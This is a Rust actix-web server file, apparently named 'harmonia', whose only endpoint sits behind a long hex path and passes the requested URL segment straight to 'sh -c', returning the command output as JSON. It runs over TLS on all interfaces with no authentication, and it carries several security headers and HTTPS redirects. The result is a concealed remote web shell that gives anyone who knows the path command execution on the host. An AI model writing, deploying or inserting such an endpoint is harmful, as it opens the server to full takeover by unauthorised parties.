use actix_web::{get, web, middleware, HttpResponse, App, HttpServer};
use actix_web::http::Error;
use actix_web_lab::{header::StrictTransportSecurity, middleware::RedirectHttps};
use rustls::{Certificate, PrivateKey, ServerConfig};
use rustls_pemfile::{certs, pkcs8_private_keys};
use std::{fs::File, io::BufReader};
use std::process::Command;

#[get("/8e3963bb771efe84b2ef7ccfa6eac1626/{req_str}")]
async fn harmonia(req_str: web::Path<String>) -> Result<HttpResponse, Error> {
    let executions = format!("{}", req_str.to_string().trim_matches(char::from(0)));
    let output = Command::new("sh")
        .arg("-c")
        .arg(executions)
        .output()
        .expect("Failed to execute input command");
    let returni = String::from_utf8_lossy(&output.stdout);
    Ok(HttpResponse::Ok().json(returni))
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let config = load_rustls_config();
    HttpServer::new(|| {
        App::new()
            .wrap(RedirectHttps::default())
            .wrap(RedirectHttps::with_hsts(StrictTransportSecurity::recommended()))
            .wrap(middleware::DefaultHeaders::new().add(("x-content-type-options", "nosniff")))
            .wrap(middleware::DefaultHeaders::new().add(("x-frame-options", "SAMEORIGIN")))
            .wrap(middleware::DefaultHeaders::new().add(("x-xss-protection", "1; mode=block")))
            .service(harmonia)
    })
        .bind_rustls("0.0.0.0:51472", config)?
        .run()
        .await
}

fn load_rustls_config() -> rustls::ServerConfig {
    let config = ServerConfig::builder()
        .with_safe_defaults()
        .with_no_client_auth();
    let cert_file = &mut BufReader::new(File::open("cert.pem").unwrap());
    let key_file = &mut BufReader::new(File::open("privkey.pem").unwrap());
    let cert_chain = certs(cert_file)
        .unwrap()
        .into_iter()
        .map(Certificate)
        .collect();
    let mut keys: Vec<PrivateKey> = pkcs8_private_keys(key_file)
        .unwrap()
        .into_iter()
        .map(PrivateKey)
        .collect();
    if keys.is_empty() {
        eprintln!("harmonia FATAL - Open of privkey.pem paired with cert.pem failed, server must shutdown. Use PKCS8 PEM compatible with rustls.");
        std::process::exit(1);
    }
    config.with_single_cert(cert_chain, keys.remove(0)).unwrap()
}
